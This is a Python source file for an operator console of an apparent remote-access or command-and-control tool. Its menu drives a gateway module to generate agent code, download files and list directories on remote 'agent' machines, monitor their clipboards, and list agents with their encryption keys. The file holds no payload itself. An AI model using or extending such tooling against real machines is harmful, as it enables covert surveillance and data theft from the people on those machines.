from rich.console import Console
from rich.table import Table
from rich.theme import Theme
from rich.prompt import Prompt

import Gateways.CybServerGateway as cybServerGateway


custom_theme = Theme({
    "success": "green",
    "info": "deep_sky_blue1",
    "error": "bold red"
})
console = Console(theme=custom_theme)

options_rows = ['Generate code for agent', 'Download file from agent', 'List agent\'s files from directory',
                'Monitor agent\'s clipboard', 'List agents', 'Close agent connection', 'Exit']


def options():
    table = Table()
    table.add_column("S. No.", style="cyan", no_wrap=True)
    table.add_column("Options", style="magenta")

    i = 1
    for option in options_rows:
        table.add_row(str(i), option)
        i = i + 1

    console.print(table)

    menu()


def menu():
    value = input('>')
    if value == '1':
        generate_code_for_agent()
    if value == '2':
        download_file_from_agent()
    if value == '3':
        list_agent_files()
    if value == '4':
        monitor_agent_clipboard()
    if value == '5':
        list_agents()
    if value == '6':
        disconnect_agent()
    if value == 'options':
        options()
    else:
        menu()


def generate_code_for_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    code = cybServerGateway.generate_first_code_for_agent(cybServerGateway.GenerateFirstCodeForAgentInputType(
        ip_address=ip_address))
    print(code)
    menu()


def download_file_from_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    console.print("Insert agent's file path", style="info")
    file_path = input('>')

    console.print(f"You are about to schedule task for downloading file {file_path} on agent {ip_address}."
                  f" Proceed?(y/n)", style="info")

    proc = input('>')

    if proc == 'y':
        cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
            ip_address=ip_address, file_path=file_path))
    else:
        console.print("Operation cancelled", style="info")

    menu()


def list_agent_files():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    console.print("Insert agent's directory path", style="info")
    dir_path = input('>')
    cybServerGateway.list_files_from_agent(cybServerGateway.ListFilesFromAgentInputType(
        ip_address=ip_address, dir_path=dir_path))
    menu()


def monitor_agent_clipboard():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')
    console.print("Insert agent's clipboard monitor duration", style="info")
    duration = input('>')

    try:
        integer = int(duration)
    except ValueError:
        console.print('The provided value is not an integer', style="error")

    cybServerGateway.monitor_clipboard_on_agent(cybServerGateway.MonitorClipboardOnAgentInputType(
        ip_address=ip_address, duration=duration))
    menu()


def disconnect_agent():
    console.print("Insert agent's ip address", style="info")
    ip_address = input('>')

    cybServerGateway.disconnect_agent(cybServerGateway.DisconnectAgentInputType(
        ip_address=ip_address))
    menu()


def list_agents():
    table = Table()
    agents = cybServerGateway.list_agents()
    if len(agents) > 0:
        headers = agents[0].keys()
        for header in headers:
            table.add_column(header, style="magenta")

        for agent in agents:
            table.add_row(str(agent['id']), agent['ip_address'], str(agent['created_at']), agent['encryption_key'],
                            str(agent['status']))

        console.print(table)
        menu()

    else:
        console.print("There are no agents added to the system", style="info")
        menu()
